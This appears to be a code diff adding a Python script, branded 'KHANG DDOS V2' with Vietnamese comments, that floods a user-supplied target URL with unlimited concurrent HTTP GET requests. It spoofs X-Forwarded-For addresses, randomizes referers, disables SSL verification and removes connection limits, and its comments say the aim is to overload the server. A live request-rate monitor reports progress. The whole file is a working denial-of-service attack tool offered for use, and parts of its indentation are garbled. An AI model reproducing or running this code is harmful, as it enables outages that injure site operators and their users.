@@ -1,0 +1,82 @@
+import asyncio
+import aiohttp
+import random
+import os
+import time
+import ujson
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+--- BANNER CHIẾN THẦN ---
+
+def banner():
+os.system('clear')
+print(f"{Fore.RED}{Style.BRIGHT}" + "X"*50)
+print(f"{Fore.WHITE}{Style.BRIGHT}    KHANG DDOS V2 - RIPEER SUPERCHARGED")
+print(f"{Fore.YELLOW}    Status: EXTREME FLOOD | Mode: L7 Get-Wait")
+print(f"{Fore.RED}{Style.BRIGHT}" + "X"*50 + "\n")
+
+Fake Data cực nặng để ép CPU Server xử lý
+
+REFERERS = ["https://google.com", "https://facebook.com", "https://youtube.com", "https://twitter.com"]
+
+async def attack(url, stats):
+# Cấu hình Connector riêng để bỏ qua mọi giới hạn an toàn
+connector = aiohttp.TCPConnector(
+limit=0,                # Không giới hạn số lượng kết nối đồng thời
+ttl_dns_cache=600,      # Cache DNS lâu hơn để đỡ tốn time lookup
+verify_ssl=False        # Bỏ qua xác thực SSL để tăng tốc
+)
+
+async with aiohttp.ClientSession(connector=connector, json_serialize=ujson.dumps) as session:  
+    while True:  
+        headers = {  
+            "User-Agent": f"KhangDDOS-{random.randint(100, 999)}",  
+            "Accept-Encoding": "gzip, deflate, br",  
+            "Referer": random.choice(REFERERS),  
+            "Connection": "keep-alive",  
+            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"  
+        }  
+        try:  
+            async with session.get(url, headers=headers, timeout=3) as response:  
+                stats['total'] += 1  
+                if response.status == 200:  
+                    stats['success'] += 1  
+                else:  
+                    stats['failed'] += 1  
+        except:  
+            stats['total'] += 1  
+            stats['failed'] += 1  
+            await asyncio.sleep(0.01) # Tránh treo máy nếu mạng lỗi
+
+async def monitor(stats):
+start_time = time.time()
+while True:
+await asyncio.sleep(1)
+elapsed = time.time() - start_time
+rps = stats['total'] / elapsed
+print(f"{Fore.CYAN}[⚡] RQS: {stats['total']} | {Fore.GREEN}SUCCESS: {stats['success']} | {Fore.RED}FAIL: {stats['failed']} | {Fore.YELLOW}SPEED: {int(rps)} RQS/s", end="\r")
+
+async def main():
+banner()
+target = input(f"{Fore.GREEN}[?] Target URL: {Fore.WHITE}")
+threads = int(input(f"{Fore.GREEN}[?] Số luồng (Nên để 500-1000): {Fore.WHITE}"))
+
+stats = {'total': 0, 'success': 0, 'failed': 0}  
+  
+print(f"\n{Fore.RED}[!] ĐANG KÍCH HOẠT TỔNG LỰC... BẤM CTRL+C ĐỂ DỪNG\n")  
+  
+# Chạy song song Monitor và các Tasks attack  
+tasks = [monitor(stats)]  
+for _ in range(threads):  
+    tasks.append(attack(target, stats))  
+  
+await asyncio.gather(*tasks)
+
+if name == "main":
+try:
+asyncio.run(main())
+except KeyboardInterrupt:
+print(f"\n{Fore.MAGENTA}[#] Khang DDOS đã dừng. Check lại host đi ông!")
+
